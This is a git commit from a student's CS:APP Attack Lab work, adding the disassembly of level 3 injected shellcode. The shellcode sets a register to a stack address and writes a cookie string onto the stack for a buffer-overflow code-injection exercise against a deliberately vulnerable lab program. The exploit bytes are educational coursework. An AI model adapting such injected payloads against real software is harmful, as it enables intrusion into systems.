1719ef3fa8d2e5ca4cb81d6da91925f5d53e99f2
111qqz <hust.111qqz@gmail.com>
2020-02-17 00:12:57 +0800

    finish csapp attacklab level3

---
+++ attacklab/level3.d
@@ -0,0 +1,14 @@
+
+level3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi
+   7:	c7 44 24 c4 35 39 62 	movl   $0x39623935,-0x3c(%rsp)
+   e:	39 
+   f:	c7 44 24 c8 39 37 66 	movl   $0x61663739,-0x38(%rsp)
+  16:	61 
+  17:	c7 44 24 cc 00 00 00 	movl   $0x0,-0x34(%rsp)
+  1e:	00 
